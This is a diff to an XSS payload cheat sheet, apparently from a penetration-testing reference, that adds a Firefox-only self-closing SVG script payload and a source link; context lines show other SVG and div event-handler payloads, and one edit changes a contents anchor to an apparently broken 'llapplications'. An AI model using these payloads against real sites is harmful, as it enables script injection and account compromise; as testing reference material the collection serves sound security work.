@@ -10,7 +10,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Javascript keylogger](#javascript-keylogger)
   - [Other ways](#other-ways)
 - [Identify an XSS endpoint](#identify-an-xss-endpoint)
-- [XSS in HTML/Applications](#xss-in-htmlapplications)
+- [XSS in HTML/Applications](#xss-in-llapplications)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
 - [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
 - [XSS in PostMessage](#xss-in-postmessage)
@@ -143,6 +143,7 @@ Svg payload
 <svg id=alert(1) onload=eval(id)>
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
+<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
 
 Div payload
 <div onpointerover="alert(45)">MOVE HERE</div>
@@ -1128,3 +1129,4 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
 - [XSS cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
+- [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
